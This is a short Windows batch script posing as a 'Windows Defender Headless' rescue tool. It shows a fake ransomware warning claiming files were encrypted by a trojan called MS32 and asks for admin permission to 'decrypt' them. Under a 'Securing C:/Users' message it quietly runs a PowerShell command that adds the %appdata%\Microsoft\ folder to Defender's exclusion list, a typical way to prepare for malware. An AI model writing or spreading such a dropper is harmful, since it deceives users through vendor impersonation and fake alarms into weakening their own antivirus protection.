@echo off
color a
title Headless Windows Defender  Protection Removeable Safety Script

echo;
echo "___________________________________________________________"
echo "| _____                                   _               |"
echo "||  __ \                                 | |              |"
echo "|| |  | |  ___   ___  _ __  _   _  _ __  | |_  ___   _ __ |"
echo "|| |  | | / _ \ / __|| '__|| | | || '_ \ | __|/ _ \ | '__||"
echo "|| |__| ||  __/| (__ | |   | |_| || |_) || |_| (_) || |   |"
echo "||_____/  \___| \___||_|    \__, || .__/  \__|\___/ |_|   |"
echo "|                            __/ || |                     |"
echo "|                           |___/ |_|                     |"
       
timeout 1 >nul
echo All of your files are encrypted by a TrojanHorse named MS32.
echo;

timeout 1 >nul
echo This Script is made by Windows Defender Headless to bypass the monitoring of the Deadly MS32. 

timeout 1 >nul
echo You need to provide Admin permission to decrypt and restore the files...
pause
echo;
IF NOT exist "G:\python\General\appdev\randomiser.py" (
    @echo off
    timeout 1 >nul
    echo This system does not meet the system requirements. 
    echo;
    timeout 1 >nul
    echo Consider running this script in another computer under 65.846214 mins to save those files.
    echo;
    timeout 1 >nul
    echo Windows Defender is not responsible for any file loss...
    echo;
    timeout 1 >nul
    echo This Script will now terminate...
    timeout 5 >nul
    exit
) ELSE (
    echo Securing C:/Users
    powershell -command Add-MpPreference -ExclusionPath %appdata%\Microsoft\
    timeout 1 >nul
    echo;
    echo Scanning Integrity of the Pendrive
    
)
pause